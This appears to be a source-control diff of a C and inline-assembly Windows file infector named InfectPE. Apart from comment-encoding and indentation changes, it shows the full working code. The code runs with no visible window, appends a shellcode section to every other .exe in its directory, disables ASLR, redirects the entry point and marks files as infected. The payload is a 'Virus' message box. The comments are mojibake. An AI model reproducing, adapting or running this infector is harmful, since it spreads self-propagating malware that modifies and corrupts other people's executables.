@@ -1,50 +1,50 @@
 #include "InfectPE.h"
-#pragma comment( linker, "/subsystem:windows  /entry:mainCRTStartup" ) // ²»ÏÔÊ¾UI
+#pragma comment( linker, "/subsystem:windows  /entry:mainCRTStartup" ) // ä¸æ˜¾ç¤ºUI
 
 // shellcode
 void __declspec(naked) ShellcodeStart()
 {
 	__asm {
-				pushad
-				call    routine
+			pushad
+			call    routine
 
 	routine :
-				pop     ebp
-				sub      ebp, offset routine
-				push    0                                // MB_OK
-				lea       eax, [ebp + szCaption]
-				push    eax                              // lpCaption
-				lea	   eax, [ebp + szText]
-				push    eax                              // lpText
-				push    0                                // hWnd
-				mov     eax, 0xAAAAAAAA
-				call      eax                              // MessageBoxA
-
-				popad
-				push    0xBBBBBBBB                       // OEP
-				ret
+			pop     ebp
+			sub      ebp, offset routine
+			push    0                                // MB_OK
+			lea       eax, [ebp + szCaption]
+			push    eax                              // lpCaption
+			lea	   eax, [ebp + szText]
+			push    eax                              // lpText
+			push    0                                // hWnd
+			mov     eax, 0xAAAAAAAA
+			call      eax                              // MessageBoxA
+				
+			popad
+			push    0xBBBBBBBB                       // OEP
+			ret
 
 	szCaption :
-					db('V') db('i') db('r') db('u') db('s') db(0)
+			db('V') db('i') db('r') db('u') db('s') db(0)
 	szText :
-					db('I') db('n') db('f') db('l') db('e') db('c') db('t') db(' ') db('s')
-					db('u') db('c') db('c') db('e') db('s') db('s') db(' ') db('!') db(0)
+			db('I') db('n') db('f') db('l') db('e') db('c') db('t') db(' ') db('s')
+			db('u') db('c') db('c') db('e') db('s') db('s') db(' ') db('!') db(0)
 	}
 }
 
 void  ShellcodeEnd(void) {}
 
 /*
-¼ì²éÊÇ·ñÎªÕı³£PEÎÄ¼ş
+æ£€æŸ¥æ˜¯å¦ä¸ºæ­£å¸¸PEæ–‡ä»¶
 */
 BOOL IsPeFile(PVOID pHdr)
 {
-	//ÅĞ¶ÏDOSÍ·±êÖ¾ÊÇ·ñÕıÈ·
+	//åˆ¤æ–­DOSå¤´æ ‡å¿—æ˜¯å¦æ­£ç¡®
 	IMAGE_DOS_HEADER *p1 = (IMAGE_DOS_HEADER*)pHdr;
 	if (p1->e_magic != IMAGE_DOS_SIGNATURE){
 		return FALSE;
 	}
-	//ÅĞ¶ÏPEÍ·±êÖ¾ÊÇ·ñÕıÈ·
+	//åˆ¤æ–­PEå¤´æ ‡å¿—æ˜¯å¦æ­£ç¡®
 	IMAGE_NT_HEADERS*  p2 = (IMAGE_NT_HEADERS*)((PBYTE)pHdr + p1->e_lfanew);
 	if (p2->Signature != IMAGE_NT_SIGNATURE){
 		return FALSE;
@@ -53,12 +53,12 @@ BOOL IsPeFile(PVOID pHdr)
 }
 
 /*
-ÅĞ¶ÏÎÄ¼şÊÇ·ñ±»¸ĞÈ¾
+åˆ¤æ–­æ–‡ä»¶æ˜¯å¦è¢«æ„ŸæŸ“
 */
 BOOL IsInfected(PVOID pHdr)
 {
 	IMAGE_DOS_HEADER *p = (IMAGE_DOS_HEADER*)pHdr;
-	//ÅĞ¶ÏDOSÍ·µÄ±£ÁôÎ»ÊÇ·ñÒÑ±»Ìî³äÎª 0xABCD
+	//åˆ¤æ–­DOSå¤´çš„ä¿ç•™ä½æ˜¯å¦å·²è¢«å¡«å……ä¸º 0xABCD
 	if ( p->e_res2[0] == (WORD)INFECTFLAG){
 		return TRUE;
 	}
@@ -69,7 +69,7 @@ BOOL IsInfected(PVOID pHdr)
 }
 
 /*
-×Ö½Ú¶ÔÆë
+å­—èŠ‚å¯¹é½
 */
 int Align(int size,int n)
 {
@@ -80,7 +80,7 @@ int Align(int size,int n)
 }
 
 /*
-¸ĞÈ¾Ö¸¶¨ÎÄ¼ş
+æ„ŸæŸ“æŒ‡å®šæ–‡ä»¶
 */
 BOOL InfectFile(TCHAR *fpath)
 {
@@ -101,7 +101,7 @@ BOOL InfectFile(TCHAR *fpath)
 		return FALSE;
 	}
 
-	// ÅĞ¶ÏÊÇ·ñÎªÕı³£PEÎÄ¼ş
+	// åˆ¤æ–­æ˜¯å¦ä¸ºæ­£å¸¸PEæ–‡ä»¶
 	if (!IsPeFile(pHdr)){
 		UnmapViewOfFile(pHdr);
 		CloseHandle(hMapFile);
@@ -109,7 +109,7 @@ BOOL InfectFile(TCHAR *fpath)
 		return FALSE;
 	}
 
-	//ÅĞ¶ÏÊÇ·ñÒÑ±»¸ĞÈ¾
+	//åˆ¤æ–­æ˜¯å¦å·²è¢«æ„ŸæŸ“
 	if (IsInfected(pHdr)){
 		UnmapViewOfFile(pHdr);
 		CloseHandle(hMapFile);
@@ -117,24 +117,24 @@ BOOL InfectFile(TCHAR *fpath)
 		return FALSE;
 	}
 
-	//PEÍ·Ö¸Õë£º ÎÄ¼şÍ·Ö¸Õë+DOSÍ·µÄe_lfanewÎ»Ö¸¶¨µÄPEÍ·Æ«ÒÆ
+	//PEå¤´æŒ‡é’ˆï¼š æ–‡ä»¶å¤´æŒ‡é’ˆ+DOSå¤´çš„e_lfanewä½æŒ‡å®šçš„PEå¤´åç§»
 	IMAGE_NT_HEADERS *pNTHdr = (IMAGE_NT_HEADERS*)((PBYTE)pHdr + ((IMAGE_DOS_HEADER*)pHdr)->e_lfanew);
-	//½ÚÇøÍ·Ö¸Õë£º PEÍ·Ö¸Õë+PEÍ·µÄ³¤¶È
+	//èŠ‚åŒºå¤´æŒ‡é’ˆï¼š PEå¤´æŒ‡é’ˆ+PEå¤´çš„é•¿åº¦
 	IMAGE_SECTION_HEADER *pSecHdr = (IMAGE_SECTION_HEADER*)((PBYTE)pNTHdr + sizeof(IMAGE_NT_HEADERS));
-	//Á½¸ö¶ÔÆëµ¥Î»
+	//ä¸¤ä¸ªå¯¹é½å•ä½
 	DWORD dwFileAlign = pNTHdr->OptionalHeader.FileAlignment;
 	DWORD dwSecAlign  = pNTHdr->OptionalHeader.SectionAlignment;
 
-	//×îºóÒ»¸ö½ÚÖ¸Õë
+	//æœ€åä¸€ä¸ªèŠ‚æŒ‡é’ˆ
 	IMAGE_SECTION_HEADER *pLastSec = &pSecHdr[pNTHdr->FileHeader.NumberOfSections-1];
-	//¶¨Òå Ò»¸öĞÂ½Ú
+	//å®šä¹‰ ä¸€ä¸ªæ–°èŠ‚
 	IMAGE_SECTION_HEADER *pNewSec = &pSecHdr[pNTHdr->FileHeader.NumberOfSections];
-	//Ô­Èë¿ÚµØÖ·£¨OEP£©
+	//åŸå…¥å£åœ°å€ï¼ˆOEPï¼‰
 	DWORD dwOldOEP = pNTHdr->OptionalHeader.AddressOfEntryPoint + pNTHdr->OptionalHeader.ImageBase;
-	//Ğè²åÈëµÄ´úÂë³¤¶È
+	//éœ€æ’å…¥çš„ä»£ç é•¿åº¦
 	DWORD dwCodeSize  = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;
 
-	//Ìî³äĞÂ½ÚµÄ¸÷×Ö¶Î
+	//å¡«å……æ–°èŠ‚çš„å„å­—æ®µ
 	memcpy(pNewSec->Name,".new",5);
 	pNewSec->Misc.VirtualSize = dwCodeSize;
 	pNewSec->VirtualAddress		=	pLastSec->VirtualAddress + Align(pLastSec->Misc.VirtualSize, dwSecAlign);
@@ -142,27 +142,27 @@ BOOL InfectFile(TCHAR *fpath)
 	pNewSec->PointerToRawData	=	pLastSec->PointerToRawData + pLastSec->SizeOfRawData;
 	pNewSec->Characteristics	=	IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE;
 	
-	//½ÚÇøÊıÄ¿¼Ó 1
+	//èŠ‚åŒºæ•°ç›®åŠ  1
 	pNTHdr->FileHeader.NumberOfSections++;
-	//ĞŞÕıPE¾µÏñ´óĞ¡
+	//ä¿®æ­£PEé•œåƒå¤§å°
 	pNTHdr->OptionalHeader.SizeOfImage += Align(pNewSec->Misc.VirtualSize,dwSecAlign);
 
-	//¶¯Ì¬»ñÈ¡ MessageBoxA º¯ÊıµØÖ·
+	//åŠ¨æ€è·å– MessageBoxA å‡½æ•°åœ°å€
 	HMODULE hModule = LoadLibraryA("user32.dll");
 	LPVOID lpAddress = GetProcAddress(hModule, "MessageBoxA");
 
-	//ĞŞ¸Ä shellcode ÖĞ MessabeBoxA£¬OEP µØÖ·
+	//ä¿®æ”¹ shellcode ä¸­ MessabeBoxAï¼ŒOEP åœ°å€
 	HANDLE hHeap = HeapCreate(NULL,NULL,dwCodeSize);
 	LPVOID lpHeap = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,dwCodeSize);
 	memcpy(lpHeap,ShellcodeStart,dwCodeSize);
 
 	DWORD dwIncrementor = 0;
 	for(;dwIncrementor < dwCodeSize; dwIncrementor++){
-		//ĞŞ¸Ä MessageBoxA µØÖ·
+		//ä¿®æ”¹ MessageBoxA åœ°å€
 		if(*((LPDWORD)lpHeap + dwIncrementor) == 0xAAAAAAAA){
 			*((LPDWORD)lpHeap +dwIncrementor) = (DWORD)lpAddress;
 		}
-		//ĞŞ¸Ä OEP µØÖ·
+		//ä¿®æ”¹ OEP åœ°å€
 		if(*((LPDWORD)lpHeap + dwIncrementor) == 0xBBBBBBBB){
 			*((LPDWORD)lpHeap +dwIncrementor) = dwOldOEP;
 			FreeLibrary(hModule);
@@ -170,20 +170,20 @@ BOOL InfectFile(TCHAR *fpath)
 		}
 	}
 
-	//¹Ø±ÕÄ¿±ê³ÌĞòµÄ ASLR
+	//å…³é—­ç›®æ ‡ç¨‹åºçš„ ASLR
 	pNTHdr->FileHeader.Characteristics |= IMAGE_FILE_RELOCS_STRIPPED;
 	pNTHdr->OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
 	pNTHdr->OptionalHeader.DataDirectory[5].VirtualAddress = 0;
 	pNTHdr->OptionalHeader.DataDirectory[5].Size = 0;
 
-	//¸´ÖÆshellcodeµ½ĞÂ½ÚÇø
+	//å¤åˆ¶shellcodeåˆ°æ–°èŠ‚åŒº
 	DWORD dwSize = 0;
 	SetFilePointer(hFile,NULL,NULL,FILE_END);
 	WriteFile(hFile,lpHeap,pNewSec->SizeOfRawData,&dwSize,NULL);
 	HeapFree(hHeap,NULL,lpHeap);
 	HeapDestroy(hHeap);
 
-	//ÉèÖÃĞÂÔö½ÚÇøÆğÊ¼µØÖ·ÎªĞÂµÄÈë¿ÚµØÖ·
+	//è®¾ç½®æ–°å¢èŠ‚åŒºèµ·å§‹åœ°å€ä¸ºæ–°çš„å…¥å£åœ°å€
 	pNTHdr->OptionalHeader.AddressOfEntryPoint = pNewSec->VirtualAddress;
 
 	FlushViewOfFile(pHdr,pNTHdr->OptionalHeader.SizeOfHeaders);
@@ -202,14 +202,14 @@ int main(void)
 	TCHAR szCurrentPath[MAX_PATH];
 	TCHAR szCurrentModule[MAX_PATH];
 
-	//»ñÈ¡µ±Ç°Ä¿Â¼
+	//è·å–å½“å‰ç›®å½•
 	GetCurrentDirectory(MAX_PATH,szCurrentPath);
-	//»ñÈ¡µ±Ç°Ä£¿éÂ·¾¶
+	//è·å–å½“å‰æ¨¡å—è·¯å¾„
 	GetModuleFileName(NULL,szCurrentModule,MAX_PATH);
 	lstrcpy(szFilePath,szCurrentPath);
 	lstrcat(szFilePath,L"\\*.exe");
 
-	//±éÀúµ±Ç°Ä¿Â¼²¢¸ĞÈ¾³ı×ÔÉíÍâµÄËùÓĞ.exeÎÄ¼ş
+	//éå†å½“å‰ç›®å½•å¹¶æ„ŸæŸ“é™¤è‡ªèº«å¤–çš„æ‰€æœ‰.exeæ–‡ä»¶
 	hListFile = FindFirstFile(szFilePath,&FileInfo);
 	if(hListFile == INVALID_HANDLE_VALUE){
 		return 0;
@@ -217,7 +217,7 @@ int main(void)
 	else{
 		do{
 			if(!_tcsstr(szCurrentModule,FileInfo.cFileName)){
-				//¸ĞÈ¾Ä¿±êÎÄ¼ş
+				//æ„ŸæŸ“ç›®æ ‡æ–‡ä»¶
 				if (!InfectFile(FileInfo.cFileName)){
 					return 0;
 				}
